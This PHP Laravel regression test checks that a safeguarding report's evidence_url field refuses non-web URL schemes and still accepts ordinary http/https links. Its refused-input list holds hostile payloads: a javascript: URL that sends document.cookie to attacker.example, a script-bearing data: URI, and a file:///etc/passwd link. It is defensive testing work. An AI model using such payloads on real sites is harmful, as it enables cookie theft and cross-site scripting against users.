<?php
// Copyright © 2024–2026 Jasper Ford
// SPDX-License-Identifier: AGPL-3.0-or-later
// Author: Jasper Ford
// See NOTICE file for attribution and acknowledgements.

declare(strict_types=1);

namespace Tests\Laravel\Feature\Security;

use App\Core\TenantContext;
use App\Models\User;
use App\Services\EmailDispatchService;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\DB;
use Laravel\Sanctum\Sanctum;
use Mockery;
use Tests\Laravel\TestCase;

/**
 * F-296 — a safeguarding report's `evidence_url` is rendered as a link in the
 * coordinator's report drawer, so the server must only store a web address
 * (http or https). Before the fix any string up to 500 characters was stored
 * byte-identically, `javascript:` and `data:` included.
 */
final class SafeguardingEvidenceUrlSchemeTest extends TestCase
{
    use DatabaseTransactions;

    protected function setUp(): void
    {
        parent::setUp();

        $mailer = Mockery::mock(EmailDispatchService::class);
        $mailer->shouldReceive('send')->andReturn(true);
        $this->app->instance(EmailDispatchService::class, $mailer);

        $tenant = DB::table('tenants')->where('id', $this->testTenantId)->first();
        $features = [];
        if ($tenant && !empty($tenant->features)) {
            $decoded = is_string($tenant->features) ? json_decode($tenant->features, true) : $tenant->features;
            $features = is_array($decoded) ? $decoded : [];
        }
        $features['caring_community'] = true;
        DB::table('tenants')->where('id', $this->testTenantId)->update(['features' => json_encode($features)]);
        TenantContext::setById($this->testTenantId);
    }

    private function actingAsMember(): int
    {
        $email = 'f296.' . bin2hex(random_bytes(6)) . '@example.test';
        $id = (int) DB::table('users')->insertGetId([
            'tenant_id'  => $this->testTenantId,
            'first_name' => 'Evidence',
            'last_name'  => 'Reporter',
            'email'      => $email,
            'username'   => 'f296_' . substr(md5($email), 0, 10),
            'password'   => password_hash('password', PASSWORD_BCRYPT),
            'balance'    => 0,
            'status'     => 'active',
            'role'       => 'member',
            'is_approved' => 1,
            'date_of_birth' => '1980-01-01',
            'preferred_language' => 'en',
            'created_at' => now(),
            'updated_at' => now(),
        ]);
        $user = User::query()->find($id);
        $this->assertNotNull($user);
        Sanctum::actingAs($user);

        return $id;
    }

    /** @return array<string, array{string}> */
    public static function refusedEvidenceUrls(): array
    {
        return [
            'javascript scheme'        => ['javascript:fetch("https://attacker.example/"+document.cookie)'],
            'javascript mixed case'    => ['JaVaScRiPt:alert(1)'],
            'javascript after spaces'  => ['   javascript:alert(1)'],
            'data uri'                 => ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
            'vbscript scheme'          => ['vbscript:msgbox(1)'],
            'file scheme'              => ['file:///etc/passwd'],
            'no scheme at all'         => ['evidence.example.org/photo.jpg'],
            'web scheme with no host'  => ['https:///photo.jpg'],
        ];
    }

    /**
     * @dataProvider refusedEvidenceUrls
     */
    public function test_a_non_web_evidence_url_is_refused_with_422_and_nothing_is_stored(string $evidenceUrl): void
    {
        $reporter = $this->actingAsMember();

        $response = $this->apiPost('/v2/caring-community/safeguarding/report', [
            'category'     => 'other',
            'severity'     => 'low',
            'description'  => 'F-296 regression, synthetic.',
            'evidence_url' => $evidenceUrl,
        ]);

        $this->assertSame(422, $response->status(), $response->getContent());
        $this->assertSame(
            0,
            DB::table('safeguarding_reports')
                ->where('tenant_id', $this->testTenantId)
                ->where('reporter_user_id', $reporter)
                ->count(),
            'a refused report must not be stored',
        );
    }

    /** @return array<string, array{string}> */
    public static function acceptedEvidenceUrls(): array
    {
        return [
            'https'      => ['https://evidence.example.org/photo-1.jpg'],
            'http'       => ['http://evidence.example.org/photo-1.jpg?size=large#top'],
            'upper case' => ['HTTPS://Evidence.Example.org/Photo.jpg'],
        ];
    }

    /**
     * Legitimate-access control: an ordinary web link is still accepted and
     * stored exactly as given.
     *
     * @dataProvider acceptedEvidenceUrls
     */
    public function test_control_a_web_evidence_url_is_accepted_and_stored_unchanged(string $evidenceUrl): void
    {
        $this->actingAsMember();

        $response = $this->apiPost('/v2/caring-community/safeguarding/report', [
            'category'     => 'other',
            'severity'     => 'low',
            'description'  => 'F-296 control, synthetic.',
            'evidence_url' => $evidenceUrl,
        ]);

        $this->assertSame(201, $response->status(), $response->getContent());
        $reportId = (int) $response->json('data.report_id');
        $this->assertSame(
            $evidenceUrl,
            DB::table('safeguarding_reports')->where('id', $reportId)->value('evidence_url'),
        );
    }

    public function test_control_a_report_with_no_evidence_url_is_still_accepted(): void
    {
        $this->actingAsMember();

        $response = $this->apiPost('/v2/caring-community/safeguarding/report', [
            'category'     => 'other',
            'severity'     => 'low',
            'description'  => 'F-296 control, synthetic, no link.',
            'evidence_url' => '   ',
        ]);

        $this->assertSame(201, $response->status(), $response->getContent());
        $reportId = (int) $response->json('data.report_id');
        $this->assertNull(DB::table('safeguarding_reports')->where('id', $reportId)->value('evidence_url'));
    }
}
